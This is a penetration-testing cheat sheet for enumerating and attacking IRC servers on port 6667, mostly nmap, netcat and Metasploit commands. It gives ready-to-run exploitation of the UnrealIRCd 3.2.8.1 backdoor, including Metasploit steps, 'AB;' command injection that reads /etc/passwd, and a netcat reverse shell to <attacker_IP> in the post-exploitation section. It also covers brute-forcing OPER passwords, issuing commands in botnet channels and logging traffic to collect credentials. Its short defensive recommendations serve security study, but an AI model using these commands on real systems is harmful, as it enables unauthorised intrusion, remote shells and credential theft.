# IRC ENUMERATION (Port 6667/TCP)

## SERVICE OVERVIEW
```
IRC (Internet Relay Chat) - Text-based chat protocol
- Default port: 6667/TCP (plaintext)
- SSL/TLS port: 6697/TCP (IRC over SSL)
- Legacy protocol but still in use
- Often used for botnet C&C (Command & Control)
- Can reveal usernames, channels, network topology
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p6667 <IP>                            # Service/Version detection
nc -nv <IP> 6667                                # Manual connection
telnet <IP> 6667                                # Alternative connection
openssl s_client -connect <IP>:6697             # SSL/TLS connection
```

## NMAP ENUMERATION
```bash
# IRC detection and enumeration
nmap -p6667 --script irc-info <IP>              # IRC server info
nmap -p6667 --script irc-botnet-channels <IP>   # Detect botnet channels
nmap -p6667 --script irc-unrealircd-backdoor <IP>  # UnrealIRCd backdoor

# Comprehensive scan
nmap -sV -p6667,6697 --script "irc-*" <IP> -oA irc_scan

# Scan range for IRC servers
nmap -p6667 --open <subnet> -oG irc_servers.txt
```

## MANUAL IRC CONNECTION
```bash
# Connect to IRC server
nc -nv <IP> 6667

# Basic IRC commands after connection:
NICK <nickname>                                 # Set nickname
USER <user> <host> <server> :<real_name>        # Set user info
JOIN #<channel>                                 # Join channel
LIST                                            # List all channels
NAMES #<channel>                                # List users in channel
WHO #<channel>                                  # Detailed user info
WHOIS <nickname>                                # Get user info
PRIVMSG #<channel> :<message>                   # Send message to channel
PRIVMSG <user> :<message>                       # Send private message
QUIT :<quit_message>                            # Disconnect

# Example connection sequence:
nc -nv <IP> 6667
> NICK testuser
> USER testuser 0 * :Test User
> LIST
> JOIN #general
> PRIVMSG #general :Hello
> QUIT :Goodbye
```

## ENUMERATE IRC SERVER
```bash
# Get server info
echo -e "NICK testbot\nUSER testbot 0 * :Bot\nVERSION\nQUIT" | nc -nv <IP> 6667

# List all channels
echo -e "NICK testbot\nUSER testbot 0 * :Bot\nLIST\nQUIT" | nc -nv <IP> 6667

# Get users in channel
echo -e "NICK testbot\nUSER testbot 0 * :Bot\nJOIN #channel\nNAMES #channel\nQUIT" | nc -nv <IP> 6667

# Python script for enumeration
cat > irc_enum.py <<'EOF'
#!/usr/bin/env python3
import socket
import time

def irc_enum(host, port=6667):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    # Send registration
    sock.send(b"NICK enumbot\r\n")
    sock.send(b"USER enumbot 0 * :Enumeration Bot\r\n")
    time.sleep(2)

    # List channels
    sock.send(b"LIST\r\n")
    time.sleep(2)

    # Get data
    data = sock.recv(4096)
    print(data.decode('utf-8', errors='ignore'))

    sock.send(b"QUIT\r\n")
    sock.close()

if __name__ == "__main__":
    import sys
    irc_enum(sys.argv[1])
EOF

python3 irc_enum.py <IP>
```

## BOTNET C&C DETECTION
```bash
# IRC is commonly used for botnet Command & Control
# Look for suspicious channels

# Nmap botnet detection
nmap -p6667 --script irc-botnet-channels <IP>

# Common botnet channel patterns:
#bot, #cmd, #control, #master, #shell, #ddos
#warez, #0day, #exploit

# Join suspicious channels
nc -nv <IP> 6667
> NICK testuser
> USER testuser 0 * :Test
> JOIN #bot
> NAMES #bot
# Look for:
# - Many users with random/similar names
# - Automated responses
# - Commands being issued
# - DDoS coordination
```

## UNREALIRCD BACKDOOR (CVE-2010-2075)
```bash
# UnrealIRCd 3.2.8.1 backdoor
# Allows remote code execution

# Nmap detection
nmap -p6667 --script irc-unrealircd-backdoor <IP>

# Metasploit exploit
msfconsole
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS <IP>
set RPORT 6667
set PAYLOAD cmd/unix/reverse
set LHOST <attacker_IP>
set LPORT 4444
exploit

# Manual exploitation
# Send: AB;<command>
nc -nv <IP> 6667
> AB;whoami
> AB;id
> AB;uname -a
```

## IRC SERVER INFORMATION
```bash
# Get detailed server info
nc -nv <IP> 6667
> NICK test
> USER test 0 * :test
> VERSION                                       # Server version
> ADMIN                                         # Admin contact
> INFO                                          # Server info
> MOTD                                          # Message of the day
> LUSERS                                        # User statistics
> STATS u                                       # Uptime
> STATS m                                       # Command statistics
> QUIT
```

## ENUMERATE USERS
```bash
# List all users (if allowed)
echo -e "NICK test\nUSER test 0 * :test\nWHO *\nQUIT" | nc -nv <IP> 6667

# Get info on specific user
echo -e "NICK test\nUSER test 0 * :test\nWHOIS admin\nQUIT" | nc -nv <IP> 6667

# Enumerate operators
echo -e "NICK test\nUSER test 0 * :test\nSTATS o\nQUIT" | nc -nv <IP> 6667

# Common IRC usernames:
admin, administrator, root, operator, bot, master
```

## IRC OPER ATTACKS
```bash
# IRC operators have elevated privileges
# Try to gain OPER status

# Brute force OPER password
# Format: OPER <username> <password>

# Manual attempt
nc -nv <IP> 6667
> NICK test
> USER test 0 * :test
> OPER admin password
> OPER admin admin
> OPER operator operator

# If successful, you have OPER privileges:
# - Kill users
# - Reload server config
# - View hidden channels
# - Set server modes
```

## METASPLOIT MODULES
```bash
msfconsole

# UnrealIRCd backdoor
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS <IP>
exploit

# IRC enumeration
use auxiliary/scanner/irc/irc_version          # Version detection

# Botnet detection
use auxiliary/scanner/irc/irc_botnet_channels
set RHOSTS <IP>
run
```

## COMMON MISCONFIGURATIONS
```
☐ IRC server exposed to internet (rare legitimate need)
☐ No password required to connect
☐ Weak OPER passwords (admin:admin)
☐ UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075)
☐ Public channels with sensitive information
☐ Botnet C&C operating openly
☐ No rate limiting (allows brute force)
☐ No logging or monitoring
☐ Outdated IRC daemon with known vulnerabilities
```

## VULNERABILITY SCANNING
```bash
# Search for IRC exploits
searchsploit irc
searchsploit unrealircd

# Known vulnerabilities:
# CVE-2010-2075: UnrealIRCd backdoor
# CVE-2009-4893: Bahamut IRCD overflow
# CVE-2008-0960: ircd-hybrid buffer overflow
# Many others for specific IRC daemons

# Check version
nmap -sV -p6667 <IP> | grep -i version
```

## QUICK WIN CHECKLIST
```
☐ Scan for IRC on port 6667/6697
☐ Connect and enumerate server info (VERSION, MOTD)
☐ List all channels (LIST command)
☐ Join suspicious channels (#bot, #cmd, etc.)
☐ Enumerate users (WHO, WHOIS)
☐ Check for UnrealIRCd backdoor (CVE-2010-2075)
☐ Attempt OPER access with common passwords
☐ Look for botnet C&C indicators
☐ Search for version-specific exploits
☐ Monitor channel traffic for sensitive info
```

## ONE-LINER ENUMERATION
```bash
# Quick IRC enumeration
echo -e "NICK test\nUSER test 0 * :test\nVERSION\nLIST\nQUIT" | nc -nv <IP> 6667

# Nmap comprehensive scan
nmap -sV -p6667,6697 --script "irc-*" <IP>
```

## SECURITY IMPLICATIONS
```
RISKS:
- Botnet Command & Control infrastructure
- Information disclosure (user enumeration)
- Lateral movement (internal IRC for company comms)
- Credential theft (if users share passwords in chat)
- Social engineering (impersonation)
- DDoS coordination (botnet channels)
- Warez/piracy distribution
- RCE via UnrealIRCd backdoor

BOTNET INDICATORS:
- Large number of users with random names
- Automated responses to commands
- Channels named #bot, #cmd, #ddos, #shell
- Users idle for extended periods
- Mass joins/parts
- Commands like !scan, !ddos, !download

RECOMMENDATIONS:
- Disable IRC if not needed
- Use IRC over SSL (port 6697)
- Require password authentication
- Implement connection rate limiting
- Monitor for botnet patterns
- Keep IRC daemon updated
- Restrict access to trusted networks
- Log all IRC activity
- Use modern alternatives (Slack, Discord, Matrix)
```

## IRC CLIENT TOOLS
```bash
# irssi (terminal IRC client)
apt-get install irssi
irssi -c <IP> -p 6667
/nick testuser
/join #channel
/list
/quit

# WeeChat (alternative client)
apt-get install weechat
weechat
/server add myserver <IP>/6667
/connect myserver
/join #channel

# HexChat (GUI client)
apt-get install hexchat
# Configure server in GUI
```

## TOOLS
```bash
# Netcat
nc -nv <IP> 6667

# Nmap
nmap -p6667 --script irc-* <IP>

# Metasploit
use exploit/unix/irc/unreal_ircd_3281_backdoor
use auxiliary/scanner/irc/irc_version

# IRC clients
irssi -c <IP> -p 6667
weechat

# searchsploit
searchsploit irc
```

## POST-EXPLOITATION
```bash
# If you gain OPER access:

# List all users
WHO *

# Kill user
KILL <nickname> :Reason

# Reload configuration
REHASH

# Set server modes
MODE #channel +s                                # Secret channel
MODE #channel +i                                # Invite only

# If UnrealIRCd backdoor:
AB;id
AB;whoami
AB;cat /etc/passwd
AB;nc <attacker_IP> 4444 -e /bin/bash          # Reverse shell
```

## INTEGRATION WITH OTHER ATTACKS
```bash
# Attack chain:

# 1. Discover IRC
nmap -p6667 --open <subnet>

# 2. Enumerate server
echo -e "NICK test\nUSER test 0 * :test\nVERSION\nLIST\nQUIT" | nc <IP> 6667

# 3. Check for UnrealIRCd backdoor
nmap -p6667 --script irc-unrealircd-backdoor <IP>

# 4. Exploit if vulnerable
msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS <IP>; exploit"

# 5. Or join botnet channels
nc <IP> 6667
> NICK test
> USER test 0 * :test
> JOIN #bot
> PRIVMSG #bot :!help                           # Try common botnet commands

# 6. Monitor for credentials/sensitive info
# Stay connected to channels and log traffic
```
